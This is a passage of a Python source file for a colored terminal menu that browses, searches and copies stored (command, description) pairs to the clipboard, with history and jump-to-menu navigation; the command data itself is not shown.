         - a tuple (cmd, desc)
         - a dict(heading -> [list of (cmd,desc)])
        We only add the *tuple* commands to 'results' if they match.
        """
        if isinstance(current, dict):
            for key, value in current.items():
                traverse_structure(value, path + [key])
        elif isinstance(current, list):
            for item in current:
                if isinstance(item, dict):
                    # heading sub-list
                    for heading, sub_list in item.items():
                        traverse_structure(sub_list, path + [heading])
                else:
                    # tuple (cmd, desc)
                    cmd, desc = item
                    if all(token in cmd.lower() or token in desc.lower() for token in tokens):
                        results.append((path, cmd, desc))
    
    traverse_structure(menu_structure, [])

    if not results:
        input(colored("No commands found. Press Enter to return...", "yellow"))
        return

    while True:
        os.system("clear" if os.name == "posix" else "cls")
        print(colored(f"Search Results for '{search_term}':", "cyan", attrs=["bold"]))
        print()

        for idx, (path, cmd, desc) in enumerate(results, start=1):
            path_str = get_colored_path(path, include_base=False)
            print(f"{idx}. {colored(path_str, 'white')} - {colored(desc, 'white')} : {colored(cmd, 'green')}")

        choice = input(colored("\nSelect a command number to copy, or press [b] to go back: ", "cyan")).strip()
        if choice.lower() == 'b':
            break
        elif choice.isdigit() and 1 <= int(choice) <= len(results):
            selected = results[int(choice) - 1]
            # Copy the command to clipboard
            pyperclip.copy(selected[1])
            command_history.append(selected[1])
            print(colored("Command copied to clipboard!", "green"))
            
            # Ask user if they want to jump to the menu location
            nav = input(colored("Press [m] to jump to the menu location of this command, or any other key to continue: ", "cyan")).strip().lower()
            if nav == 'm':
                # selected[0] is the path
                go_to_path(selected[0])

#
# 7) Utility Functions for Display Commands
#
def count_total_commands(commands):
    """
    Counts how many actual (cmd, desc) pairs are in 'commands', 
    including those nested under headings (dict items).
    """
    total = 0
    for item in commands:
        if isinstance(item, dict):
            # heading -> subcommands
            for heading, sub_list in item.items():
                total += len(sub_list)
        else:
            total += 1
    return total

def get_command_by_index(commands, index):
    """
    Returns the command (string) at the given 1-based index within 'commands',
    taking into account headings.
    """
    current_idx = 0
    for item in commands:
        if isinstance(item, dict):
            for heading, sub_list in item.items():
                for (cmd, desc) in sub_list:
                    current_idx += 1
                    if current_idx == index:
                        return cmd
        else:
            cmd, desc = item
            current_idx += 1
            if current_idx == index:
                return cmd
    return None

#
# 8) Go to Path
#
def go_to_path(path):
    """
    Attempts to navigate 'menu_structure' following the list of keys in 'path'.
    Stops if it encounters a heading (dict inside a list) or if the key isn't found.
    If it ends on a list, calls display_commands() to show that submenu.
    """
    current = menu_structure
    path_stack = []
    menu_stack = []
    
    for p in path:
        if isinstance(current, dict) and p in current:
            # Dive deeper into the dictionary
            menu_stack.append(current)
            path_stack.append(p)
            current = current[p]
        else:
            # Possibly a heading or invalid key
            break

    # If we end on a list, display it
    if isinstance(current, list):
        title = path_stack[-1] if path_stack else "Unknown"
        # Display that submenu
        display_commands(current, title, path_stack[:-1])
    else:
        print(colored("Could not jump to an exact sub-menu (likely a heading or no match).", "red"))
        input(colored("Press Enter to continue...", "yellow"))

#
# 9) Main Loop
#
def main():
    current_menu = menu_structure
    menu_stack = []
    path_stack = []

    while True:
        os.system("clear" if os.name == "posix" else "cls")
        full_colored_path = get_colored_path(path_stack, include_base=True)
        print(full_colored_path)
        print()

        keys = list(current_menu.keys())
        for i, key in enumerate(keys, start=1):
            print(colored(f"{i}. {key}", "white"))

        print(colored("\n[s] Search | [b] Back | [h] History | [q] Quit", "magenta"))
        choice = input(colored("\nSelect option: ", "cyan")).strip()

        if choice.lower() == "q":
            print(colored("\nExiting...", "magenta"))
            sys.exit()
        elif choice.lower() == "s":
            search_commands()
        elif choice.lower() == "b" and menu_stack:
            current_menu = menu_stack.pop()
            path_stack.pop()
        elif choice.lower() == "h":
            view_history()
        elif choice.isdigit() and 1 <= int(choice) <= len(keys):
            selected_key = keys[int(choice) - 1]
            if isinstance(current_menu[selected_key], dict):
                menu_stack.append(current_menu)
                current_menu = current_menu[selected_key]
                path_stack.append(selected_key)
            elif isinstance(current_menu[selected_key], list):
                display_commands(current_menu[selected_key], selected_key, path_stack)

if __name__ == "__main__":
    main()
